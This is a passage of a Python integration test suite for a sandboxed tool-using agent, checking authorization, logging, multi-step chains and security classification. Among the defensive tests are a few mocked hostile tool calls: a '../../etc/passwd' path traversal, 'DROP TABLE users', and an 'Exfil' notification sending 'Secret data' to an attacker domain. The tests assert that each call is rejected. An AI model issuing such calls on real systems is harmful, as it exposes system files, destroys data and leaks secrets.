import json
from pathlib import Path
import tempfile
import unittest

from agents.tool_agent import (
    AgentResult,
    ToolUsingAgent,
    create_full_tool_registry,
)
from core.authorization import AllowlistAuthorizationPolicy
from core.interfaces.tool import Tool
from core.interfaces.tool_registry import ToolRegistry
from core.logging import EventCollector
from core.models import MockModel
from core.security import SecurityClassifier, SecurityStatus
from tools.command_tool import CommandTool, SYNTHETIC_CANARY_SHELL
from tools.database_tool import DatabaseTool
from tools.file_tool import FileTool
from tools.http_tool import HTTPTool
from tools.mock_api_server import MockAPIServer
from tools.notification_tool import NotificationTool


class TrackingToolWrapper(Tool):
    """Helper wrapper to count execute calls without modifying tool implementation."""

    def __init__(self, tool):
        self._tool = tool
        self.execute_call_count = 0

    @property
    def name(self):
        return self._tool.name

    @property
    def description(self):
        return self._tool.description

    @property
    def schema(self):
        return self._tool.schema

    def get_metadata(self):
        return self._tool.get_metadata()

    def reset(self):
        if hasattr(self._tool, "reset") and callable(self._tool.reset):
            self._tool.reset()

    def execute(self, args=None, **kwargs):
        self.execute_call_count += 1
        return self._tool.execute(args, **kwargs)


class TestToolAgentIntegration(unittest.TestCase):
    """
    Comprehensive integration test suite for ToolUsingAgent with all five controlled tools:
    1. FileTool
    2. DatabaseTool
    3. HTTPTool
    4. NotificationTool
    5. CommandTool
    """

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.base_dir = Path(self.temp_dir.name).resolve()

        # 1. FileTool fixture
        self.file_sandbox = self.base_dir / "file_sandbox"
        self.file_sandbox.mkdir(parents=True, exist_ok=True)
        (self.file_sandbox / "public.txt").write_text("Public file content\n", encoding="utf-8")
        (self.file_sandbox / "canary.txt").write_text("SATLAS_CANARY_FILE_001\n", encoding="utf-8")
        self.file_tool = FileTool(root_path=self.file_sandbox)

        # 2. DatabaseTool fixture
        self.db_path = self.base_dir / "test.db"
        self.database_tool = DatabaseTool(database_path=self.db_path)

        # 3. HTTPTool fixture with local MockAPIServer
        self.mock_server = MockAPIServer()
        self.mock_server.start()
        self.http_tool = HTTPTool(base_url=self.mock_server.base_url)

        # 4. NotificationTool fixture
        self.notification_tool = NotificationTool()

        # 5. CommandTool fixture
        self.cmd_workspace = self.base_dir / "cmd_workspace"
        self.cmd_workspace.mkdir(parents=True, exist_ok=True)
        self.command_tool = CommandTool(workspace_path=self.cmd_workspace)

        # Tracking wrappers
        self.tracking_file_tool = TrackingToolWrapper(self.file_tool)
        self.tracking_database_tool = TrackingToolWrapper(self.database_tool)
        self.tracking_http_tool = TrackingToolWrapper(self.http_tool)
        self.tracking_notification_tool = TrackingToolWrapper(self.notification_tool)
        self.tracking_command_tool = TrackingToolWrapper(self.command_tool)

        # Full registry with tracking tools
        self.registry = ToolRegistry()
        self.registry.register(self.tracking_file_tool)
        self.registry.register(self.tracking_database_tool)
        self.registry.register(self.tracking_http_tool)
        self.registry.register(self.tracking_notification_tool)
        self.registry.register(self.tracking_command_tool)

        self.classifier = SecurityClassifier()

    def tearDown(self):
        self.mock_server.stop()
        self.temp_dir.cleanup()

    # -------------------------------------------------------------------------
    # 1. Registry & Setup
    # -------------------------------------------------------------------------

    def test_full_registry_registration_and_retrieval(self):
        """Verify all five tools are registered and retrievable via ToolRegistry."""
        tools = self.registry.list_tools()
        self.assertIn("file_tool", tools)
        self.assertIn("database_tool", tools)
        self.assertIn("http_tool", tools)
        self.assertIn("notification_tool", tools)
        self.assertIn("command_tool", tools)
        self.assertEqual(len(tools), 5)

        for tool_name in ["file_tool", "database_tool", "http_tool", "notification_tool", "command_tool"]:
            tool = self.registry.get(tool_name)
            self.assertIsNotNone(tool)
            self.assertEqual(tool.name, tool_name)
            metadata = tool.get_metadata()
            self.assertEqual(metadata["name"], tool_name)
            self.assertIn("schema", metadata)

    def test_create_full_tool_registry_helper(self):
        """Verify create_full_tool_registry helper correctly registers all five tools."""
        helper_reg = create_full_tool_registry(
            file_tool=self.file_tool,
            database_tool=self.database_tool,
            http_tool=self.http_tool,
            notification_tool=self.notification_tool,
            command_tool=self.command_tool,
        )
        self.assertEqual(len(helper_reg.list_tools()), 5)
        self.assertIn("command_tool", helper_reg.list_tools())

    # -------------------------------------------------------------------------
    # 2. Model-Generated Tool Calls for Every Tool
    # -------------------------------------------------------------------------

    def test_model_call_file_tool_list(self):
        """FileTool: Model requests directory listing."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "file_tool",
            "arguments": {"operation": "list", "path": "."},
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["file_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("List files in directory")

        self.assertTrue(result.tool_requested)
        self.assertTrue(result.tool_executed)
        self.assertEqual(result.tool_call.tool_name, "file_tool")
        self.assertIsInstance(result.tool_result, dict)
        self.assertIn("entries", result.tool_result)
        filenames = [e["name"] for e in result.tool_result["entries"]]
        self.assertIn("public.txt", filenames)
        self.assertIn("canary.txt", filenames)

    def test_model_call_file_tool_read(self):
        """FileTool: Model requests file read."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "file_tool",
            "arguments": {"operation": "read", "path": "canary.txt"},
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["file_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("Read canary.txt")

        self.assertTrue(result.tool_executed)
        self.assertEqual(result.tool_result["content"].strip(), "SATLAS_CANARY_FILE_001")

    def test_model_call_file_tool_write(self):
        """FileTool: Model requests file write."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "file_tool",
            "arguments": {"operation": "write", "path": "notes.txt", "content": "agent written content"},
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["file_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("Write notes.txt")

        self.assertTrue(result.tool_executed)
        self.assertTrue((self.file_sandbox / "notes.txt").exists())
        self.assertEqual((self.file_sandbox / "notes.txt").read_text(encoding="utf-8"), "agent written content")

    def test_model_call_database_tool_select(self):
        """DatabaseTool: Model requests SELECT query."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "database_tool",
            "arguments": {
                "operation": "query",
                "query": "SELECT id, username, role FROM users WHERE username = ?",
                "parameters": ["regular_user"],
            },
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["database_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("Find user regular_user")

        self.assertTrue(result.tool_executed)
        self.assertEqual(result.tool_call.tool_name, "database_tool")
        self.assertIsInstance(result.tool_result, dict)
        self.assertEqual(result.tool_result["count"], 1)
        self.assertEqual(result.tool_result["rows"][0][1], "regular_user")

    def test_model_call_database_tool_insert(self):
        """DatabaseTool: Model requests INSERT query."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "database_tool",
            "arguments": {
                "operation": "insert",
                "query": "INSERT INTO users (username, email, role, synthetic_token, canary_secret) VALUES (?, ?, ?, ?, ?)",
                "parameters": ["carol", "carol@satlas.local", "analyst", "token_carol", "secret_carol"],
            },
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["database_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("Insert user carol")

        self.assertTrue(result.tool_executed)
        self.assertEqual(result.tool_result["rows_affected"], 1)

    def test_model_call_http_tool_get(self):
        """HTTPTool: Model requests GET on localhost mock API."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "http_tool",
            "arguments": {
                "method": "GET",
                "path": "/health",
            },
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["http_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("Check API status")

        self.assertTrue(result.tool_executed)
        self.assertEqual(result.tool_call.tool_name, "http_tool")
        self.assertEqual(result.tool_result["status_code"], 200)
        self.assertEqual(result.tool_result["body"]["status"], "ok")

    def test_model_call_http_tool_post(self):
        """HTTPTool: Model requests POST on localhost mock API."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "http_tool",
            "arguments": {
                "method": "POST",
                "path": "/records",
                "body": {"name": "test_rec", "value": "test_val"},
            },
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["http_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("Create record via HTTP POST")

        self.assertTrue(result.tool_executed)
        self.assertEqual(result.tool_result["status_code"], 201)
        self.assertEqual(result.tool_result["body"]["record"]["name"], "test_rec")

    def test_model_call_notification_tool_send(self):
        """NotificationTool: Model requests send notification."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "notification_tool",
            "arguments": {
                "operation": "send",
                "recipient": "security@satlas.local",
                "subject": "Lab Alert",
                "body": "Test alert notification content",
            },
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["notification_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("Send security alert")

        self.assertTrue(result.tool_executed)
        self.assertEqual(result.tool_call.tool_name, "notification_tool")
        self.assertTrue(result.tool_result["success"])
        self.assertEqual(result.tool_result["recipient"], "security@satlas.local")

    def test_model_call_notification_tool_list_and_get(self):
        """NotificationTool: Model requests list and get notifications."""
        # Pre-seed one notification
        self.notification_tool.execute({
            "operation": "send",
            "recipient": "alice@satlas.local",
            "subject": "Notice 1",
            "body": "Body 1",
        })

        # Test list
        model_payload_list = json.dumps({
            "type": "tool_call",
            "tool": "notification_tool",
            "arguments": {"operation": "list"},
        })
        model = MockModel(response=model_payload_list)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["notification_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        res_list = agent.send_message("List notifications")
        self.assertTrue(res_list.tool_executed)
        self.assertEqual(res_list.tool_result["count"], 1)

        # Test get
        notif_id = res_list.tool_result["notifications"][0]["notification_id"]
        model_payload_get = json.dumps({
            "type": "tool_call",
            "tool": "notification_tool",
            "arguments": {"operation": "get", "notification_id": notif_id},
        })
        model.set_response(model_payload_get)

        res_get = agent.send_message("Get notification details")
        self.assertTrue(res_get.tool_executed)
        self.assertEqual(res_get.tool_result["notification"]["notification_id"], notif_id)

    def test_model_call_command_tool_echo(self):
        """CommandTool: Model requests allowed echo command."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "command_tool",
            "arguments": {
                "command": "echo",
                "arguments": ["hello", "controlled", "lab"],
            },
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["command_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("Echo words")

        self.assertTrue(result.tool_executed)
        self.assertEqual(result.tool_call.tool_name, "command_tool")
        self.assertEqual(result.tool_result["stdout"], "hello controlled lab\n")
        self.assertEqual(result.tool_result["return_code"], 0)

    def test_model_call_command_tool_cat_and_ls(self):
        """CommandTool: Model requests cat on test_data.txt in workspace."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "command_tool",
            "arguments": {
                "command": "cat",
                "arguments": ["test_data.txt"],
            },
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["command_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("Read test data via command tool")

        self.assertTrue(result.tool_executed)
        self.assertEqual(result.tool_result["stdout"], "synthetic test data\n")

    # -------------------------------------------------------------------------
    # 3. Authorization Integration for ALL Five Tools
    # -------------------------------------------------------------------------

    def test_authorization_denial_file_tool(self):
        """Authorization: Denying file_tool blocks execution and asserts call count == 0."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "file_tool",
            "arguments": {"operation": "read", "path": "canary.txt"},
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=[])  # Deny all
        collector = EventCollector()
        agent = ToolUsingAgent(
            model=model,
            tool_registry=self.registry,
            authorization_policy=policy,
            event_collector=collector,
        )

        result = agent.send_message("Read canary file")

        self.assertTrue(result.tool_requested)
        self.assertFalse(result.tool_executed)
        self.assertTrue(result.authorization_denied)
        self.assertEqual(self.tracking_file_tool.execute_call_count, 0)
        self.assertIsNone(result.tool_result)

        # Observability verification
        events = collector.get_events(session_id=result.session_id)
        types = [e.event_type for e in events]
        self.assertIn("authorization_decision", types)
        self.assertIn("authorization_denied", types)
        self.assertNotIn("tool_execution", types)

    def test_authorization_denial_database_tool(self):
        """Authorization: Denying database_tool blocks execution and asserts call count == 0."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "database_tool",
            "arguments": {"operation": "query", "query": "SELECT * FROM users"},
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=[])
        collector = EventCollector()
        agent = ToolUsingAgent(
            model=model,
            tool_registry=self.registry,
            authorization_policy=policy,
            event_collector=collector,
        )

        result = agent.send_message("Select from users")

        self.assertTrue(result.tool_requested)
        self.assertFalse(result.tool_executed)
        self.assertTrue(result.authorization_denied)
        self.assertEqual(self.tracking_database_tool.execute_call_count, 0)

        events = collector.get_events(session_id=result.session_id)
        types = [e.event_type for e in events]
        self.assertIn("authorization_denied", types)
        self.assertNotIn("tool_execution", types)

    def test_authorization_denial_http_tool(self):
        """Authorization: Denying http_tool blocks execution and asserts call count == 0."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "http_tool",
            "arguments": {"method": "GET", "path": "/api/status"},
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=[])
        collector = EventCollector()
        agent = ToolUsingAgent(
            model=model,
            tool_registry=self.registry,
            authorization_policy=policy,
            event_collector=collector,
        )

        result = agent.send_message("Get status")

        self.assertTrue(result.tool_requested)
        self.assertFalse(result.tool_executed)
        self.assertTrue(result.authorization_denied)
        self.assertEqual(self.tracking_http_tool.execute_call_count, 0)

        events = collector.get_events(session_id=result.session_id)
        types = [e.event_type for e in events]
        self.assertIn("authorization_denied", types)
        self.assertNotIn("tool_execution", types)

    def test_authorization_denial_notification_tool(self):
        """Authorization: Denying notification_tool blocks execution and asserts call count == 0."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "notification_tool",
            "arguments": {
                "operation": "send",
                "recipient": "alice@satlas.local",
                "subject": "Test",
                "body": "Denied",
            },
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=[])
        collector = EventCollector()
        agent = ToolUsingAgent(
            model=model,
            tool_registry=self.registry,
            authorization_policy=policy,
            event_collector=collector,
        )

        result = agent.send_message("Send notification")

        self.assertTrue(result.tool_requested)
        self.assertFalse(result.tool_executed)
        self.assertTrue(result.authorization_denied)
        self.assertEqual(self.tracking_notification_tool.execute_call_count, 0)

        events = collector.get_events(session_id=result.session_id)
        types = [e.event_type for e in events]
        self.assertIn("authorization_denied", types)
        self.assertNotIn("tool_execution", types)

    def test_authorization_denial_command_tool(self):
        """Authorization: Denying command_tool blocks execution and asserts call count == 0."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "command_tool",
            "arguments": {"command": "echo", "arguments": ["hello"]},
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=[])
        collector = EventCollector()
        agent = ToolUsingAgent(
            model=model,
            tool_registry=self.registry,
            authorization_policy=policy,
            event_collector=collector,
        )

        result = agent.send_message("Run echo")

        self.assertTrue(result.tool_requested)
        self.assertFalse(result.tool_executed)
        self.assertTrue(result.authorization_denied)
        self.assertEqual(self.tracking_command_tool.execute_call_count, 0)

        events = collector.get_events(session_id=result.session_id)
        types = [e.event_type for e in events]
        self.assertIn("authorization_denied", types)
        self.assertNotIn("tool_execution", types)

    # -------------------------------------------------------------------------
    # 4. Observability Integration
    # -------------------------------------------------------------------------

    def test_observability_full_event_sequence_and_session_correlation(self):
        """Observability: Full event sequence preserves session_id and metadata."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "notification_tool",
            "arguments": {
                "operation": "send",
                "recipient": "user@satlas.local",
                "subject": "Observability Test",
                "body": "Payload",
            },
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["notification_tool"])
        collector = EventCollector()
        agent = ToolUsingAgent(
            model=model,
            tool_registry=self.registry,
            authorization_policy=policy,
            event_collector=collector,
            system_prompt_version="v2.1",
        )

        result = agent.send_message("Send observability notification", session_id="obs_sess_001")

        self.assertEqual(result.session_id, "obs_sess_001")
        events = collector.get_events(session_id="obs_sess_001")
        self.assertTrue(len(events) >= 6)

        expected_types = [
            "user_input",
            "model_response",
            "tool_call",
            "authorization_decision",
            "tool_execution",
            "final_response",
        ]
        actual_types = [e.event_type for e in events]
        for exp in expected_types:
            self.assertIn(exp, actual_types)

        for event in events:
            self.assertEqual(event.session_id, "obs_sess_001")
            self.assertEqual(event.system_prompt_version, "v2.1")
            self.assertEqual(event.model, "MockModel")

    # -------------------------------------------------------------------------
    # 5. Multi-Step Tool Chain
    # -------------------------------------------------------------------------

    def test_multistep_tool_chain_file_then_database(self):
        """Multi-Step: 2-step chain (FileTool -> DatabaseTool -> Final response)."""
        # Create a spec file
        (self.file_sandbox / "query_target.txt").write_text("regular_user\n", encoding="utf-8")

        responses = [
            # Step 1: Model requests FileTool read
            json.dumps({
                "type": "tool_call",
                "tool": "file_tool",
                "arguments": {"operation": "read", "path": "query_target.txt"},
            }),
            # Step 2: Model receives file result and requests DatabaseTool query
            json.dumps({
                "type": "tool_call",
                "tool": "database_tool",
                "arguments": {
                    "operation": "query",
                    "query": "SELECT * FROM users WHERE username = ?",
                    "parameters": ["regular_user"],
                },
            }),
            # Step 3: Model returns final response
            json.dumps({
                "type": "final",
                "content": "User regular_user retrieved successfully after reading target specification.",
            }),
        ]

        model = MockModel(responses=responses)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["file_tool", "database_tool"])
        collector = EventCollector()
        agent = ToolUsingAgent(
            model=model,
            tool_registry=self.registry,
            authorization_policy=policy,
            event_collector=collector,
            max_steps=5,
        )

        result = agent.send_message("Read query target and lookup user", session_id="chain_sess_001")

        self.assertTrue(result.tool_executed)
        self.assertEqual(self.tracking_file_tool.execute_call_count, 1)
        self.assertEqual(self.tracking_database_tool.execute_call_count, 1)
        self.assertEqual(len(result.tool_calls), 2)
        self.assertEqual(result.tool_calls[0].tool_name, "file_tool")
        self.assertEqual(result.tool_calls[1].tool_name, "database_tool")
        self.assertIn("User regular_user retrieved successfully", result.final_response)

        # Event sequence and correlation
        events = collector.get_events(session_id="chain_sess_001")
        for e in events:
            self.assertEqual(e.session_id, "chain_sess_001")

        event_types = [e.event_type for e in events]
        # Must have tool_execution twice and final_response only once at the end
        self.assertEqual(event_types.count("tool_execution"), 2)
        self.assertEqual(event_types.count("final_response"), 1)
        self.assertEqual(event_types[-1], "final_response")

    def test_multistep_tool_chain_three_tools(self):
        """Multi-Step: 3-step chain involving FileTool, DatabaseTool, and NotificationTool."""
        responses = [
            # Step 1: File read
            json.dumps({
                "type": "tool_call",
                "tool": "file_tool",
                "arguments": {"operation": "read", "path": "public.txt"},
            }),
            # Step 2: Database query
            json.dumps({
                "type": "tool_call",
                "tool": "database_tool",
                "arguments": {
                    "operation": "query",
                    "query": "SELECT count(*) AS total FROM users",
                },
            }),
            # Step 3: Notification send
            json.dumps({
                "type": "tool_call",
                "tool": "notification_tool",
                "arguments": {
                    "operation": "send",
                    "recipient": "admin@satlas.local",
                    "subject": "Status Report",
                    "body": "Completed multi-step audit.",
                },
            }),
            # Step 4: Final response
            json.dumps({
                "type": "final",
                "content": "All three tools completed and notification sent.",
            }),
        ]

        model = MockModel(responses=responses)
        policy = AllowlistAuthorizationPolicy(
            allowed_tools=["file_tool", "database_tool", "notification_tool"]
        )
        collector = EventCollector()
        agent = ToolUsingAgent(
            model=model,
            tool_registry=self.registry,
            authorization_policy=policy,
            event_collector=collector,
            max_steps=5,
        )

        result = agent.send_message("Execute three-tool sequence")

        self.assertEqual(self.tracking_file_tool.execute_call_count, 1)
        self.assertEqual(self.tracking_database_tool.execute_call_count, 1)
        self.assertEqual(self.tracking_notification_tool.execute_call_count, 1)
        self.assertEqual(len(result.tool_calls), 3)
        self.assertIn("All three tools completed", result.final_response)

    def test_multistep_stops_immediately_on_authorization_denial(self):
        """Multi-Step: Chain stops immediately when authorization denies step 2."""
        responses = [
            # Step 1: File read (allowed)
            json.dumps({
                "type": "tool_call",
                "tool": "file_tool",
                "arguments": {"operation": "read", "path": "public.txt"},
            }),
            # Step 2: Database query (will be denied)
            json.dumps({
                "type": "tool_call",
                "tool": "database_tool",
                "arguments": {"operation": "query", "query": "SELECT * FROM users"},
            }),
        ]

        model = MockModel(responses=responses)
        # Policy allows file_tool but denies database_tool
        policy = AllowlistAuthorizationPolicy(allowed_tools=["file_tool"])
        agent = ToolUsingAgent(
            model=model,
            tool_registry=self.registry,
            authorization_policy=policy,
            max_steps=5,
        )

        result = agent.send_message("Read file then query database")

        self.assertEqual(self.tracking_file_tool.execute_call_count, 1)
        self.assertEqual(self.tracking_database_tool.execute_call_count, 0)
        self.assertTrue(result.authorization_denied)
        self.assertIn("database_tool", result.error)

    # -------------------------------------------------------------------------
    # 6. Error Handling
    # -------------------------------------------------------------------------

    def test_error_unknown_tool(self):
        """Error handling: Model requests nonexistent tool."""
        model_payload = json.dumps({"type": "tool_call", "tool": "ghost_tool", "arguments": {}})
        model = MockModel(response=model_payload)
        agent = ToolUsingAgent(model=model, tool_registry=self.registry)

        result = agent.send_message("Call ghost tool")
        self.assertFalse(result.tool_executed)
        self.assertIn("not found", result.error)

    def test_error_malformed_tool_call(self):
        """Error handling: Model produces malformed tool call JSON."""
        model_payload = json.dumps({"type": "tool_call", "arguments": "not-a-dict"})
        model = MockModel(response=model_payload)
        agent = ToolUsingAgent(model=model, tool_registry=self.registry)

        result = agent.send_message("Call malformed")
        self.assertFalse(result.tool_executed)
        self.assertIn("Parse error", result.error)

    def test_error_command_tool_timeout(self):
        """Error handling: CommandTool timeout error handled gracefully."""
        short_timeout_tool = CommandTool(workspace_path=self.cmd_workspace, timeout=0.000001)
        reg = ToolRegistry()
        reg.register(short_timeout_tool)
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "command_tool",
            "arguments": {"command": "ls"},
        })
        model = MockModel(response=model_payload)
        agent = ToolUsingAgent(model=model, tool_registry=reg)

        result = agent.send_message("Run ls with tiny timeout")
        self.assertFalse(result.tool_executed)
        self.assertIn("timed out", result.error)

    def test_error_http_mock_api_error(self):
        """Error handling: HTTPTool 404 endpoint handled gracefully."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "http_tool",
            "arguments": {"method": "GET", "path": "/api/nonexistent"},
        })
        model = MockModel(response=model_payload)
        agent = ToolUsingAgent(model=model, tool_registry=self.registry)

        result = agent.send_message("Request missing endpoint")
        self.assertTrue(result.tool_executed)
        self.assertEqual(result.tool_result["status_code"], 404)

    def test_error_invalid_database_query(self):
        """Error handling: Destructive SQL query rejected by DatabaseTool safety boundary."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "database_tool",
            "arguments": {"operation": "query", "query": "DROP TABLE users"},
        })
        model = MockModel(response=model_payload)
        agent = ToolUsingAgent(model=model, tool_registry=self.registry)

        result = agent.send_message("Drop users table")
        self.assertFalse(result.tool_executed)
        self.assertIn("Tool execution failed", result.error)

    def test_error_invalid_file_path(self):
        """Error handling: Path traversal attempt rejected by FileTool sandbox."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "file_tool",
            "arguments": {"operation": "read", "path": "../../etc/passwd"},
        })
        model = MockModel(response=model_payload)
        agent = ToolUsingAgent(model=model, tool_registry=self.registry)

        result = agent.send_message("Read outside sandbox")
        self.assertFalse(result.tool_executed)
        self.assertIn("Tool execution failed", result.error)

    def test_error_invalid_notification_recipient(self):
        """Error handling: External recipient domain rejected by NotificationTool boundary."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "notification_tool",
            "arguments": {
                "operation": "send",
                "recipient": "attacker@evil-external-domain.com",
                "subject": "Exfil",
                "body": "Secret data",
            },
        })
        model = MockModel(response=model_payload)
        agent = ToolUsingAgent(model=model, tool_registry=self.registry)

        result = agent.send_message("Send exfil email")
        self.assertFalse(result.tool_executed)
        self.assertIn("Tool execution failed", result.error)

    # -------------------------------------------------------------------------
    # 7. Security Classification (PASS / CANDIDATE / CONFIRMED)
    # -------------------------------------------------------------------------

    def test_security_classification_pass(self):
        """Classification: Safe, authorized tool request is classified as PASS."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "file_tool",
            "arguments": {"operation": "read", "path": "public.txt"},
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["file_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("Read public.txt")
        self.assertTrue(result.tool_executed)

        sec_result = self.classifier.classify_agent_result(result)
        self.assertEqual(sec_result.status, SecurityStatus.PASS)
        self.assertFalse(sec_result.evidence.security_boundary_crossed)

    def test_security_classification_candidate(self):
        """Classification: Suspicious tool request blocked by authorization is CANDIDATE."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "command_tool",
            "arguments": {"command": "cat", "arguments": ["canary.txt"]},
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=[])  # Deny
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("Access canary via command tool")
        self.assertFalse(result.tool_executed)
        self.assertTrue(result.authorization_denied)

        sec_result = self.classifier.classify_agent_result(result, is_suspicious=True)
        self.assertEqual(sec_result.status, SecurityStatus.CANDIDATE)
        self.assertTrue(sec_result.evidence.suspicious_behavior_observed)
        self.assertFalse(sec_result.evidence.security_boundary_crossed)

    def test_security_classification_confirmed(self):
        """Classification: Suspicious tool request allowed and executed is CONFIRMED."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "command_tool",
            "arguments": {"command": "cat", "arguments": ["canary.txt"]},
        })
        model = MockModel(response=model_payload)
        # Policy explicitly allows it in controlled test
        policy = AllowlistAuthorizationPolicy(allowed_tools=["command_tool"])
        agent = ToolUsingAgent(model=model, tool_registry=self.registry, authorization_policy=policy)

        result = agent.send_message("Access canary via command tool")
        self.assertTrue(result.tool_executed)

        sec_result = self.classifier.classify_agent_result(result, is_suspicious=True)
        self.assertEqual(sec_result.status, SecurityStatus.CONFIRMED)
        self.assertTrue(sec_result.evidence.suspicious_behavior_observed)
        self.assertTrue(sec_result.evidence.security_boundary_crossed)

    # -------------------------------------------------------------------------
    # 8. Cross-Tool Security Test
    # -------------------------------------------------------------------------

    def test_cross_tool_security_boundary_case_a_denied(self):
        """Cross-Tool Security: Case A — Model requests suspicious CommandTool operation, denied."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "command_tool",
            "arguments": {"command": "cat", "arguments": ["canary.txt"]},
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=[])  # Deny
        collector = EventCollector()
        agent = ToolUsingAgent(
            model=model,
            tool_registry=self.registry,
            authorization_policy=policy,
            event_collector=collector,
        )

        result = agent.send_message("Attempt canary access via command tool")

        self.assertFalse(result.tool_executed)
        self.assertTrue(result.authorization_denied)
        self.assertEqual(self.tracking_command_tool.execute_call_count, 0)

        sec_result = self.classifier.classify_agent_result(result, is_suspicious=True)
        self.assertEqual(sec_result.status, SecurityStatus.CANDIDATE)

        events = collector.get_events(session_id=result.session_id)
        types = [e.event_type for e in events]
        self.assertIn("authorization_denied", types)
        self.assertNotIn("tool_execution", types)

    def test_cross_tool_security_boundary_case_b_allowed(self):
        """Cross-Tool Security: Case B — Explicit test policy allows harmless command, confined to workspace."""
        model_payload = json.dumps({
            "type": "tool_call",
            "tool": "command_tool",
            "arguments": {"command": "echo", "arguments": ["safe", "boundary", "check"]},
        })
        model = MockModel(response=model_payload)
        policy = AllowlistAuthorizationPolicy(allowed_tools=["command_tool"])
        collector = EventCollector()
        agent = ToolUsingAgent(
            model=model,
            tool_registry=self.registry,
            authorization_policy=policy,
            event_collector=collector,
        )

        result = agent.send_message("Run safe command")

        self.assertTrue(result.tool_executed)
        self.assertEqual(self.tracking_command_tool.execute_call_count, 1)
        self.assertEqual(result.tool_result["stdout"], "safe boundary check\n")

        sec_result = self.classifier.classify_agent_result(result)
        self.assertEqual(sec_result.status, SecurityStatus.PASS)

        events = collector.get_events(session_id=result.session_id)
        types = [e.event_type for e in events]
        self.assertIn("tool_execution", types)

    # -------------------------------------------------------------------------
    # 9. Common Interface Lifecycle
    # -------------------------------------------------------------------------

    def test_agent_lifecycle_methods(self):
        """Lifecycle: Verify start(), stop(), reset(), get_state(), get_logs(), and clear_logs()."""
        collector = EventCollector()
        model = MockModel(response="hello")
        agent = ToolUsingAgent(
            model=model,
            tool_registry=self.registry,
            event_collector=collector,
            system_prompt_version="v3.0",
            max_steps=3,
        )

        # Initial state
        state = agent.get_state()
        self.assertEqual(state["state"], "idle")
        self.assertTrue(state["is_running"])
        self.assertEqual(len(state["tools"]), 5)
        self.assertEqual(state["system_prompt_version"], "v3.0")
        self.assertEqual(state["max_steps"], 3)

        # start / stop
        agent.stop()
